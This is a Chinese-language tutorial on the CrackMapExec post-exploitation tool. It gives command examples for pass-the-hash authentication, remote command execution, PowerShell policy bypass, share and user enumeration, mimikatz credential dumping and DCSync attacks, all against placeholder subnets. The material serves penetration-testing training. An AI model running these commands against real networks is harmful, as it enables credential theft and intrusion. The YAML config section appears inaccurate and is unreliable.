### CrackMapExec 工具介绍

CrackMapExec（CME）是一款专为渗透测试人员和红队成员设计的多功能后渗透工具，主要用于管理大型Active Directory网络。CME集成了多种攻击技术，能够进行横向移动、凭证测试、执行命令、收集敏感信息等操作。其核心功能基于SMB协议，但也支持其他协议如SSH、WinRM、LDAP等。

### 主要功能

1. **凭证验证**：
   - 测试和验证用户凭证在目标系统上的有效性。
   
2. **横向移动**：
   - 利用有效凭证在网络中进行横向移动，包括远程执行命令、上传和下载文件等。
   
3. **信息收集**：
   - 收集目标系统的信息，如用户列表、共享资源、操作系统版本等。
   
4. **凭证抓取**：
   - 从目标系统中提取密码散列值、明文密码等敏感信息。
   
5. **集成攻击模块**：
   - 集成了多种攻击模块，如Mimikatz、DCSync、Kerberoasting等。

### 安装 CrackMapExec

CrackMapExec 可以在多种操作系统上安装，包括Linux和Windows。以下是一些常见的安装方法：

#### 1. 在 Kali Linux 上安装

Kali Linux 通常预装了 CrackMapExec。如果没有，可以通过以下命令安装：

```bash
sudo apt-get update
sudo apt-get install crackmapexec
```

#### 2. 从源代码安装

你也可以从 GitHub 仓库克隆并安装 CrackMapExec：

```bash
git clone https://github.com/Porchetta-Industries/CrackMapExec
cd CrackMapExec
python3 setup.py install
```

### 使用方法

CrackMapExec 提供了多种功能和选项，可以通过命令行参数进行配置。以下是一些常见的使用场景和命令示例：

#### 1. 测试凭证有效性

验证一组凭证在目标系统上的有效性：

```bash
crackmapexec smb 192.168.1.0/24 -u username -p password
```

使用NTLM哈希进行认证：

```bash
crackmapexec smb 192.168.1.0/24 -u username -H <NTLM-hash>
```

#### 2. 执行远程命令

在目标系统上执行命令：

```bash
crackmapexec smb 192.168.1.0/24 -u username -p password -x 'ipconfig /all'
```

使用PowerShell脚本执行：

```bash
crackmapexec smb 192.168.1.0/24 -u username -p password -X 'powershell.exe -ExecutionPolicy Bypass -File script.ps1'
```

#### 3. 上传和下载文件

上传文件到目标系统：

```bash
crackmapexec smb 192.168.1.0/24 -u username -p password --upload local_file remote_path
```

下载文件从目标系统：

```bash
crackmapexec smb 192.168.1.0/24 -u username -p password --download remote_file local_path
```

#### 4. 收集信息

列出共享资源：

```bash
crackmapexec smb 192.168.1.0/24 -u username -p password --shares
```

获取用户列表：

```bash
crackmapexec smb 192.168.1.0/24 -u username -p password --users
```

#### 5. 执行内置模块

使用Mimikatz模块提取凭证：

```bash
crackmapexec smb 192.168.1.0/24 -u username -p password -M mimikatz
```

执行DCSync攻击：

```bash
crackmapexec smb 192.168.1.0/24 -u username -p password -M dcsync
```

#### 6. 使用配置文件

CrackMapExec支持使用YAML配置文件来简化操作。创建一个配置文件，例如`cme.yml`：

```yaml
credentials:
  username: 'user'
  password: 'pass'
targets:
  - '192.168.1.0/24'
```

使用配置文件运行CrackMapExec：

```bash
crackmapexec smb -y cme.yml
```

### 结论

CrackMapExec 是一个功能强大的后渗透工具，通过其多种功能和模块，能够极大地简化和加速渗透测试和红队演练中的横向移动和凭证测试。熟练掌握CME的使用可以显著提升在复杂网络环境中的渗透能力和效率。